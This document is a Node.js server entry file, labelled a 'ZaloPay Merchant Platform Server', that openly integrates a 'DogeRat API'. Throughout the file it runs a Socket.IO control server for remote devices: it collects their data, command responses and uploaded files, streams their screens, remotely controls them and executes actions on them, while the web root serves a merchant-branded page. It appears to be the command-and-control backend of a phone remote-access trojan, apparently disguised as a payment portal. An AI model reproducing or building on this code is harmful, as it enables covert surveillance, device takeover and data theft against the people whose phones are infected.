// ZaloPay Merchant Platform Server
// Main server entry point combining DogeRat API and Merchant/Admin platforms

const http = require('http');
const { Server } = require('socket.io');
const https = require('https');
const path = require('path');
const fs = require('fs');

// Load configuration
const config = require('./config');
const logger = require('./utils/logger');

// Create Express app
const { createApp } = require('./app');
const app = createApp();

// Create HTTP server
const server = http.createServer(app);

// Initialize Socket.IO
const io = new Server(server, {
  cors: {
    origin: config.cors.origin,
    methods: ['GET', 'POST'],
  },
});

// Initialize database connection
const { connect: connectDatabase, disconnect: disconnectDatabase } = require('./config/database');

// Initialize repositories
const DeviceRepository = require('./repositories/deviceRepository');
const DeviceDataRepository = require('./repositories/deviceDataRepository');

// Initialize services
const DeviceService = require('./services/deviceService');
const ActionService = require('./services/actionService');
const ScreenStreamService = require('./services/screenStreamService');
const RemoteControlService = require('./services/remoteControlService');

// Create instances
const deviceRepository = new DeviceRepository();
const deviceDataRepository = new DeviceDataRepository();
const deviceService = new DeviceService(deviceRepository, deviceDataRepository, io);
const actionService = new ActionService(deviceService, io);
const screenStreamService = new ScreenStreamService(deviceService, io);
const remoteControlService = new RemoteControlService(deviceService, io);

// Store services in app for route access
app.set('deviceService', deviceService);
app.set('actionService', actionService);
app.set('screenStreamService', screenStreamService);
app.set('remoteControlService', remoteControlService);
app.set('deviceRepository', deviceRepository);
app.set('deviceDataRepository', deviceDataRepository);
app.set('io', io); // Store Socket.IO instance for routes

// Socket.IO authentication (optional for backward compatibility)
const { socketAuth } = require('./middleware/socketAuth');
io.use(socketAuth);

// Socket.IO rate limiting
const { socketRateLimit } = require('./middleware/rateLimiter');
io.use((socket, next) => {
  try {
    socketRateLimit(socket, next);
  } catch (error) {
    next(error);
  }
});

// Import handlers
const { handleConnection, handleDisconnection } = require('./sockets/connectionHandler');
const { handleData, handleCommandResponse, handleMessage, handleFile } = require('./sockets/dataHandlers');
const { handleSocketError, handleSocketDisconnect } = require('./sockets/errorHandler');
const { setupReconnectionHandling } = require('./sockets/reconnectionHandler');
const { setupScreenStreamHandlers } = require('./sockets/screenStreamHandler');
const { setupRemoteControlHandlers } = require('./sockets/remoteControlHandler');
const { initializeSockets } = require('./sockets');
const metrics = require('./utils/metrics');

// Load legacy data.json if exists
let legacyData = {};
try {
  if (fs.existsSync(config.legacy.dataFile)) {
    legacyData = JSON.parse(fs.readFileSync(config.legacy.dataFile, 'utf8'));
  }
} catch (err) {
  logger.warn('Error loading legacy data.json:', err.message);
}

// =======================
// LEGACY ROUTES (for backward compatibility)
// =======================

// Root route - serve merchant index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../static/merchant', 'index.html'));
});

// Legacy API routes (for backward compatibility)
app.get('/api/devices', async (req, res, next) => {
  try {
    const devices = await deviceService.getAllDevices();
    res.json(devices);
  } catch (error) {
    next(error);
  }
});

app.get('/api/device/:id', async (req, res, next) => {
  try {
    const device = await deviceService.getDeviceById(req.params.id);
    res.json(device);
  } catch (error) {
    next(error);
  }
});

app.post('/api/device/:id/action', async (req, res, next) => {
  try {
    const { action, params } = req.body;
    const result = await actionService.executeAction(req.params.id, action, params);
    res.json(result);
  } catch (error) {
    next(error);
  }
});

// Serve uploaded files
const express = require('express');
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Text data endpoint (for compatibility)
app.get('/text', (req, res) => {
  const legacyData = {};
  try {
    if (fs.existsSync(config.legacy?.dataFile)) {
      const data = JSON.parse(fs.readFileSync(config.legacy.dataFile, 'utf8'));
      res.send(data.text || '');
      return;
    }
  } catch (err) {
    logger.warn('Error loading legacy data.json:', err.message);
  }
  res.send('');
});

// =======================
// SOCKET.IO CONNECTION
// =======================

// Initialize Socket.IO handlers (includes admin handlers)
initializeSockets(io);

// DogeRat device connection handlers
io.on('connection', async (socket) => {
  try {
    // Record socket connection
    metrics.recordSocketConnection();

    // Handle connection
    await handleConnection(socket, deviceService, deviceRepository, deviceDataRepository);

    // Setup reconnection handling
    setupReconnectionHandling(socket, deviceService, deviceRepository);

    // Handle disconnection
    socket.on('disconnect', async (reason) => {
      metrics.recordSocketDisconnection();
      await handleDisconnection(socket, deviceService, deviceRepository);
      handleSocketDisconnect(socket, reason);
    });

    // Handle errors
    socket.on('error', (error) => {
      metrics.recordError('socket_error');
      handleSocketError(socket, error);
    });

    // Handle incoming messages from device
    socket.on('message', async (messageData) => {
      await handleMessage(socket, messageData, deviceService);
    });

    // Handle data responses from device
    socket.on('data', async (dataPacket) => {
      await handleData(socket, dataPacket, deviceService);
    });

    // Handle command responses from device
    socket.on('commend-response', async (response) => {
      await handleCommandResponse(socket, response, deviceService);
    });

    // Handle file uploads from device
    socket.on('file', async (fileData) => {
      await handleFile(socket, fileData, deviceService);
    });

    // Setup screen streaming handlers
    setupScreenStreamHandlers(socket, screenStreamService);

    // Setup remote control handlers
    setupRemoteControlHandlers(socket, remoteControlService);
  } catch (error) {
    logger.error('Error in socket connection handler:', error);
    metrics.recordError('connection_error');
    handleSocketError(socket, error);
  }
});

// =======================
// PERIODIC TASKS
// =======================

// Ping all devices every 5 seconds
setInterval(() => {
  try {
    io.sockets.sockets.forEach((socket, socketId) => {
      io.to(socketId).emit('ping', {});
    });
  } catch (error) {
    logger.error('Error in ping interval:', error);
  }
}, config.socket.pingInterval);

// Keep server alive by pinging itself every 5 minutes (if URL is configured)
if (config.keepAlive.url) {
  setInterval(() => {
    try {
      https.get(config.keepAlive.url, (response) => {
        logger.debug('Keep-alive ping successful');
      }).on('error', (err) => {
        logger.warn('Keep-alive ping failed:', err.message);
      });
    } catch (error) {
      logger.error('Error in keep-alive interval:', error);
    }
  }, config.keepAlive.interval);
}

// Error handling is done in app.js

// =======================
// START SERVER
// =======================

const PORT = config.server.port;

// Initialize database and repositories before starting server
async function startServer() {
  try {
    // Connect to database
    await connectDatabase();
    
    // Initialize repositories with database connection
    await deviceRepository.init();
    await deviceDataRepository.init();
    
    // Start server
    server.listen(PORT, () => {
      logger.info(`Server listening on port ${PORT}`);
      logger.info(`Web interface available at http://localhost:${PORT}`);
      logger.info(`Environment: ${config.server.env}`);
    });
  } catch (error) {
    logger.error('Failed to start server:', error);
    process.exit(1);
  }
}

startServer();

// Graceful shutdown
async function gracefulShutdown(signal) {
  logger.info(`${signal} signal received: closing HTTP server`);
  
  server.close(async () => {
    logger.info('HTTP server closed');
    
    try {
      await disconnectDatabase();
      logger.info('Database disconnected');
    } catch (error) {
      logger.error('Error disconnecting from database:', error);
    }
    
    process.exit(0);
  });
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
